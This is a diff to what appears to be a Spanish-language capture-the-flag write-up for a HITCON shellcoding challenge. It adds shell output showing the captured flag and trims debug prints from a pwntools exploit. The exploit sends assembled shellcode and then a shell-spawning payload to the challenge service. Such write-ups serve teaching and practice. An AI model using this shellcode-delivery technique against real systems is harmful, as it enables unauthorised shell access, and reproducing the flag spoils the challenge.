@@ -300,6 +300,9 @@ conn.close()
 Y por fin, la ansiada flag:
 
 ```
+$ pwd
+/home/easy_to_say
+$ cat flag
 hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
 ```
 
@@ -349,9 +352,7 @@ syscall
 jmp loop
 '''
 
-print shellcode
 payload = asm(shellcode)
-print payload
 p.send(payload)
 sleep(0.5)
 p.sendline(asm(shellcraft.amd64.linux.sh()))
